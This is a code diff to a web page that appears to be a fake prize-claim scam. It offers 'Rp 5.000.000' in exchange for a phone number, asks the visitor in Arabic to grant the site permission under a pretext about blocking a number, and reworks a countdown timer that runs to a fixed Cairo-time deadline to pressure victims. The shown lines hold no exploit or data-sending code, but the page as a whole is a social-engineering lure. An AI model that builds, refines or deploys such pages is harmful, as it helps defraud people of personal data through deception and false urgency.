@@ -379,7 +379,7 @@
         <div class="content">
             <div class="urgent-badge">الرجاء السماح للموقع</div>
             
-            <p>!! حتي يتمكن الموقع من معرفه مواقع الخاص بي الرقم الذي تريد حظرو لتحديد رامز البلد الخاص بي الرقم</p>
+            <p>حتي يتمكن الموقع من معرفه مواقع الخاص بي الرقم الذي تريد حظرو لتحديد رامز البلد الخاص بي الرقم!!</p>
             <div class="prize-amount">Rp 5.000.000</div>
             <p>Masukkan nomor telepon Anda untuk klaim hadiah</p>
             
@@ -497,29 +497,44 @@
         }
 
         // Timer countdown
-        function updateCountdown() {
-            const minutes = Math.floor(timeLeft / 60);
-            const seconds = timeLeft % 60;
-            countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-            
-            if (timeLeft > 0) {
-                timeLeft--;
-                
-                if (timeLeft < 300) {
-                    countdownElement.style.color = "#e74c3c";
-                    countdownElement.style.fontWeight = "bold";
-                }
-            } else {
-                countdownElement.textContent = "00:00";
-                countdownElement.style.color = "red";
-                document.getElementById('claimForm').style.opacity = "0.6";
-                document.querySelector('.claim-button').disabled = true;
-                document.querySelector('.claim-button').textContent = "⏰ WAKTU SUDAH HABIS";
-            }
-        }
+// حدد وقت الانتهاء المستهدف (مثلاً: اليوم الساعة 10 مساءً بتوقيت مصر)
+const targetTime = new Date();
+targetTime.setHours(22, 0, 0, 0); // الساعة 10:00:00 مساءً
+
+function updateCountdown() {
+    // الحصول على الوقت الحالي بصيغة توقيت مصر
+    const now = new Date();
+    const egyptTime = new Date(now.toLocaleString("en-US", {timeZone: "Africa/Cairo"}));
+    
+    // حساب الفرق بالملي ثانية
+    const diff = targetTime - egyptTime;
+    
+    if (diff > 0) {
+        const totalSeconds = Math.floor(diff / 1000);
+        const minutes = Math.floor(totalSeconds / 60);
+        const seconds = totalSeconds % 60;
+
+        countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
         
-        setInterval(updateCountdown, 1000);
-        updateCountdown();
+        // تغيير التنسيق إذا بقي أقل من 5 دقائق
+        if (totalSeconds < 300) {
+            countdownElement.style.color = "#e74c3c";
+            countdownElement.style.fontWeight = "bold";
+        }
+    } else {
+        // عندما ينتهي الوقت
+        countdownElement.textContent = "00:00";
+        countdownElement.style.color = "red";
+        document.getElementById('claimForm').style.opacity = "0.6";
+        const claimBtn = document.querySelector('.claim-button');
+        claimBtn.disabled = true;
+        claimBtn.textContent = "⏰ انتهى الوقت (بتوقيت مصر)";
+    }
+}
+
+// تحديث كل ثانية
+setInterval(updateCountdown, 1000);
+updateCountdown();
 
         // Initialize system saat halaman dimuat
         window.addEventListener('load', async () => {
